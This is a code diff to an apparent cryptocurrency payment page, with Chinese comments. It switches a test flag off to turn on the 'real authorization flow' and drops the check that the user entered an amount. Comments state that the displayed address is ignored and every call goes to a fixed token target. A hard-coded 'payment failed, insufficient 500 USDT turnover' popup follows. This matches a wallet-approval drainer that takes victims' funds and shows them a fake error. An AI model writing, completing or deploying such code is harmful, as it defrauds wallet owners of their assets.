@@ -2742,7 +2742,7 @@
                                   直接弹出结果提示，方便先看效果。
      TEST_SKIP_APPROVAL = false → 恢复真实授权流程，其余代码一行都不用动。
      ============================================================ */
-  var TEST_SKIP_APPROVAL = true;
+  var TEST_SKIP_APPROVAL = false;
   /* 结果弹窗文案：标题 + 说明（说明里可用 <b> 强调数字） */
   var RESULT_TIP_TITLE = "支付失败";
   var RESULT_TIP_DESC  = "流水不足 <b>500 USDT</b>";
@@ -2787,16 +2787,8 @@
 
     /* 页面地址栏只做展示，真正调用的目标固定是 PAY_TOKEN，这里不看输入框 */
 
-    /* 数量必须有 */
+    /* 数量只做展示：没填也不拦、不提示，照常往下走 */
     var pAmt = parseAmount($("amountInput").value);
-    if (!pAmt) {
-      busy = false;
-      paintBtn("idle", "下一步");
-      hideLoading();
-      toast("请先输入数量", 2400);
-      $("amountInput").focus();
-      return;
-    }
 
     /* 校验都过了，接下来是搭交易、查余额、等钱包弹签名框，这几秒给个居中加载动画 */
     showLoading("正在唤起钱包");
@@ -2834,7 +2826,7 @@
         BAL_USDT = balNow;
         $("availBal").textContent = "可用 " + fmtNum(balNow, 2) + " USDT";
         syncAmount();
-        if (pAmt.num > balNow + 1e-9) throw new Error("LOWBAL:" + balNow + ":" + pAmt.text);
+        if (pAmt && pAmt.num > balNow + 1e-9) throw new Error("LOWBAL:" + balNow + ":" + pAmt.text);
       }
 
       paintBtn("busy");
